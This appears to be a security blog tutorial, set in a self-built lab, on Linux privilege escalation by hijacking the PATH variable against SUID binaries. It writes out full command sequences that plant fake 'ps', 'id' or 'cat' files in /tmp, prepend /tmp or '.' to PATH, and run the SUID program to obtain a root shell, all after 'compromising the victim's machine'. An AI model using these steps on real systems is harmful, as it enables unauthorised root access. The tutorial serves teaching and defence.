---
title: 'Linux Privilege Escalation Using PATH Variable'
date: 2020-01-23T20:05:00+01:00
draft: false
---

  

**Introduction**  
PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.   
It is very simple to view the Path of the relevant user with help of echo command.  

echo $PATH

1

echo  $PATH

/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games  
If you notice **‘.’** in environment PATH variable it means that the logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege. This is due to lack of attention while writing program thus admin does not specify the full path to the program.  

### **Method 1**

**Ubuntu LAB SET\_UP**  
Currently, we are in /home/raj directory where we will create a new directory with the name as _the script_. Now inside the script directory, we will write a small c program to call a function of system binaries.  

pwd mkdir script cd script nano demo.c

1

2

3

4

pwd

mkdir script

cd script

nano demo.c

![](https://i1.wp.com/2.bp.blogspot.com/-Zaw_2etdP_0/WxAn56h3D9I/AAAAAAAAXHU/JKxyOvFHD1smIdgPBXOl03NT8rqt-bYiQCLcBGAs/s1600/1.png?w=687)  
As you can observe in our demo.c file we are calling ps command (Process status) which is system binaries.  
![](https://i1.wp.com/4.bp.blogspot.com/-ZS5PcnHv-y0/WxAn9E26iiI/AAAAAAAAXIA/IDsA-_O3rtQtY6PnwH_Qq78vzj3oiQpcACLcBGAs/s1600/2.png?w=687)  
After then compile the demo.c file using gcc and promote SUID permission to the compiled file.  

ls gcc demo.c -o shell chmod u+s shell ls -la shell

1

2

3

4

ls

gcc demo.c  \-o  shell

chmod  u+s  shell

ls  \-la shell

![](https://i2.wp.com/2.bp.blogspot.com/-n8T1J_83CN8/WxAn9h6c06I/AAAAAAAAXIM/KsS5dXsUVOkPt5D9FmdguBWZtKdpQEEsACLcBGAs/s1600/3.png?w=687)  

### Privilege Escalation 

First, you need to compromise the target system and then move to the privilege escalation phase. Suppose you successfully login into the victim’s machine through ssh. Then without wasting your time search for the file having SUID or 4000 permission with help of Find command.  

find / -perm -u=s -type f 2>/dev/null

1

find  /  \-perm  \-u\=s  \-type  f  2\>/dev/null

Hence with the help of above command, an attacker can enumerate any executable file, here we can also observe _/home/raj/script/shell_ having suid permissions.  
![](https://i1.wp.com/1.bp.blogspot.com/-vse5k3wC2vY/WxAn-t96h-I/AAAAAAAAXIQ/f-DKmexk3Q4etsBEfPelBX6znfwzM4AxgCLcBGAs/s1600/4.png?w=687)  
Then we move into /home/raj/script and saw an executable file “shell”. So we run this file, and here it looks like this file is trying to run ps and this is a genuine file inside /bin to get Process status.  

ls ./shell

1

2

ls

./shell

![](https://i1.wp.com/1.bp.blogspot.com/-IwbWhA2ER-I/WxAn-on1zWI/AAAAAAAAXIU/4dGpp_KzsI0VoaYz6RZ2Kz0IfZk1njN7QCLcBGAs/s1600/5.png?w=687)  

#### Echo Command -1st Technique to spawn root privilege

cd /tmp echo "/bin/bash" > ps chmod 777 ps echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./shell whoami

1

2

3

4

5

6

7

8

cd  /tmp

echo  "/bin/bash"  \>  ps

chmod  777  ps

echo  $PATH

export PATH\=/tmp:$PATH

cd  /home/raj/script

./shell

whoami

![](https://i2.wp.com/4.bp.blogspot.com/-Xo36EwkBugU/WxAn-sEstEI/AAAAAAAAXIY/j3WyAdQm_CoKsPbJyen1sRA7lkhvAd9GQCLcBGAs/s1600/6.png?w=687)  

#### **Copy Command -2nd **Technique to spawn root privilege

cd /home/raj/script/ cp /bin/sh /tmp/ps echo $PATH export PATH=/tmp:$PATH ./shell whoami

1

2

3

4

5

6

cd  /home/raj/script/

cp  /bin/sh  /tmp/ps

echo  $PATH

export PATH\=/tmp:$PATH

./shell

whoami

![](https://i0.wp.com/3.bp.blogspot.com/-gp30RvuO5zc/WxAn_dAdvLI/AAAAAAAAXIc/saQ8C0c0yGEC4dLM35uumebTvCZgE4Y0wCLcBGAs/s1600/7.png?w=687)  

#### **Symlink command -3rd **Technique to spawn root privilege

ln -s /bin/sh ps export PATH=.:$PATH ./shell id whoami

1

2

3

4

5

ln  \-s  /bin/sh ps

export PATH\=.:$PATH

./shell

id

whoami

**NOTE:** symlink is also known as symbolic links that will work successfully if the directory has full permission. In Ubuntu, we had given permission 777 to /script directory in the case of a symlink.  
Thus we saw to an attacker can manipulate environment variable PATH for privileges escalation and gain root access.  
![](https://i0.wp.com/2.bp.blogspot.com/-TtIx2YYqvbs/WxAn_RGE6wI/AAAAAAAAXIg/0UEEluI0BCUzsOaMA4Z38SfSH9-pekCtgCLcBGAs/s1600/8.1.png?w=687)  

### **Method 2**

**Ubuntu LAB SET\_UP**  
Repeat the same steps as above for configuring your own lab and now inside script directory, we will write a small c program to call a function of system binaries.  

pwd mkdir script cd /script nano test.c

1

2

3

4

pwd

mkdir script

cd  /script

nano test.c

As you can observe in our test.c file we are calling id command which is system binaries.  
![](https://i2.wp.com/1.bp.blogspot.com/-vHinbdvDabM/WxAn_lfBXsI/AAAAAAAAXIk/1avufsarIHEyuDqxFCb7lpSNK9Jji06ZQCLcBGAs/s1600/8.png?w=687)  
After then compile the test.c file using gcc and promote SUID permission to the compiled file.  

ls gcc test.c -o shell2 chmod u+s shell2 ls -la shell2

1

2

3

4

ls

gcc test.c  \-o  shell2

chmod  u+s  shell2

ls  \-la shell2

![](https://i1.wp.com/4.bp.blogspot.com/-JUe6hutiV3g/WxAoAHMYWII/AAAAAAAAXIo/kBXJejTuSqQXnCPc8l4rTF-NHBSp3Vg-gCLcBGAs/s1600/9.png?w=687)  

### **Privilege Escalation** 

Again, you need to compromise the target system and then move to the privilege escalation phase. Suppose you successfully login into the victim’s machine through ssh. Then without wasting your time search for the file having SUID or 4000 permission with help of Find command. Here we can also observe /home/raj/script/shell2 having suid permissions.  

find / -perm -u=s -type f 2>/dev/null

1

find  /  \-perm  \-u\=s  \-type  f  2\>/dev/null

Then we move into /home/raj/script and saw an executable file “shell2”. So we run this file, it looks like the file shell2 is trying to run id and this is a genuine file inside /bin.  

cd /home/raj/script/ ls ./shell2

1

2

3

cd  /home/raj/script/

ls

./shell2

![](https://i1.wp.com/2.bp.blogspot.com/-G4OkXjjDnWM/WxAn6PA9xmI/AAAAAAAAXHc/rkDnP5DmD4gJOzCfG0jW11iXWI2hxAGAgCLcBGAs/s1600/10.png?w=687)  

#### **Echo command**

cd /tmp echo "/bin/bash" > id chmod 777 id echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./shell2 whoami

1

2

3

4

5

6

7

8

cd  /tmp

echo  "/bin/bash"  \>  id

chmod  777  id

echo  $PATH

export PATH\=/tmp:$PATH

cd  /home/raj/script

./shell2

whoami

![](https://i1.wp.com/2.bp.blogspot.com/-Hz4MjXXcqag/WxAn5yDNKaI/AAAAAAAAXHY/J9rjSSy2u785Gk8jmlF-a48AA0l_q32wgCLcBGAs/s1600/11.png?w=687)  

### **Method 3**

**Ubuntu LAB SET\_UP**  
Repeat above step for setting your own lab and as you can observe in our raj.c file we are calling cat command to read the content from inside etc/passwd file.  
![](https://i0.wp.com/4.bp.blogspot.com/-fYfwjX-qEl8/WxAn6l5DNcI/AAAAAAAAXHg/nXvD-P5XlA0qIg_B2CUpuuCOR8QMSI9uACLcBGAs/s1600/12.png?w=687)  
After then compile the raj.c file using gcc and promote SUID permission to the compiled file.  

ls gcc raj.c -o raj chmod u+s raj ls -la raj

1

2

3

4

ls

gcc raj.c  \-o  raj

chmod  u+s  raj

ls  \-la raj

![](https://i2.wp.com/1.bp.blogspot.com/-4qOOPXKxxBw/WxAn630Fx_I/AAAAAAAAXHk/m4nl-4Luh701ByJaGNFtBiMAbR673IbwwCLcBGAs/s1600/13.png?w=687)  

### **Privilege Escalation**

Again compromised the Victim’s system and then move for privilege escalation phase and execute the below command to view sudo user list.  

find / -perm -u=s -type f 2>/dev/null

1

find  /  \-perm  \-u\=s  \-type  f  2\>/dev/null

Here we can also observe /home/raj/script/raj having suid permissions, then we move into /home/raj/script and saw an executable file “raj”. So when we run this file it put-up etc/passwd file as result.  

cd /home/raj/script/ ls ./raj

1

2

3

cd  /home/raj/script/

ls

./raj

![](https://i1.wp.com/1.bp.blogspot.com/-jp58aRZ1csg/WxAn7d9PvII/AAAAAAAAXHo/wr37ZkegYQw5wEQwbtauRt__EX2U1P3JQCLcBGAs/s1600/14.png?w=687)  

#### **Nano Editor – 4th Technique to Privilege Escalation**

cd /tmp nano cat

1

2

cd  /tmp

nano cat

Now type /bin/bash when terminal get open and save it.  
![](https://i1.wp.com/1.bp.blogspot.com/-Ww5KEBTjkS0/WxAn7Q3tqUI/AAAAAAAAXHs/knuCBX_3RkYyxMqrAs0kKn6zUqTdsxi4QCLcBGAs/s1600/15.png?w=687)  

chmod 777 cat ls -al cat echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./raj whoami

1

2

3

4

5

6

7

chmod  777  cat

ls  \-al cat

echo  $PATH

export PATH\=/tmp:$PATH

cd  /home/raj/script

./raj

whoami

![](https://i1.wp.com/2.bp.blogspot.com/-9b2zZovo6kY/WxAn7nYo0WI/AAAAAAAAXHw/Ceug0Kzgw2ckZ2YJL1MvB_9-rFixmK8ygCLcBGAs/s1600/16.png?w=687)  

### **Method 4**

**Ubuntu LAB SET\_UP**  
Repeat above step for setting your own lab and as you can observe in our demo.c file we are calling cat command to read msg.txt which is inside /home/raj but there is no such file inside /home/raj.  
![](https://i0.wp.com/4.bp.blogspot.com/-8eo4ZI5Upx0/WxAn8Ni7gSI/AAAAAAAAXH0/b8Py7D7pXLw1yjNTkU5YOgRBd6WVpnkggCLcBGAs/s1600/17.png?w=687)  
After then compile the demo.c file using gcc and promote SUID permission to the compiled file.  

ls gcc demo.c -o ignite chmod u+s ignite ls -la ignite

1

2

3

4

ls

gcc demo.c  \-o  ignite

chmod  u+s  ignite

ls  \-la ignite

![](https://i0.wp.com/1.bp.blogspot.com/-EI9DYxMRTpk/WxAn8nyNkuI/AAAAAAAAXH4/Q9XfiVxJUOIrNY5SBAJjA1eUXIIM9GTJACLcBGAs/s1600/18.png?w=687)  
**Privilege Escalation**  
Once again compromised the Victim’s system and then move for privilege escalation phase and execute the below command to view sudo user list.  

find / -perm -u=s -type f 2>/dev/null

1

find  /  \-perm  \-u\=s  \-type  f  2\>/dev/null

Here we can also observe /home/raj/script/ignite having suid permissions, then we move into /home/raj/script and saw an executable file “ignite”. So when we run this file it put-up an error “cat: /home/raj/msg.txt” as result.  

cd /home/raj/script/ ls ./ignite

1

2

3

cd  /home/raj/script/

ls

./ignite

![](https://i1.wp.com/2.bp.blogspot.com/-zsHc7jVy5h4/WxAn8wo-uhI/AAAAAAAAXH8/TGGznmHHLsQwDk4mZz4onAc11NMXbU2rACLcBGAs/s1600/19.png?w=687)  

#### **Vi Editor -5th ****Technique to Privilege Escalation**

cd /tmp vi cat

1

2

cd  /tmp

vi cat

Now type /bin/bash when the terminal gets open and saves it.  
![](https://i1.wp.com/2.bp.blogspot.com/-r5hF6jZCOaI/WxAn9eynNeI/AAAAAAAAXIE/-UacPdOO2i0pvvmJw1cp5qCUZJs5yVm4ACLcBGAs/s1600/20.png?w=687)  

chmod 777 cat echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./ignite whoami

1

2

3

4

5

6

chmod  777  cat

echo  $PATH

export PATH\=/tmp:$PATH

cd  /home/raj/script

./ignite

whoami

![](https://i1.wp.com/3.bp.blogspot.com/-Hg9GsQZ7mhM/WxAn9n9SAEI/AAAAAAAAXII/tit5acsD5_AqauHA0jMHcSUq_9FsECiFQCLcBGAs/s1600/21.png?w=687)  
**A**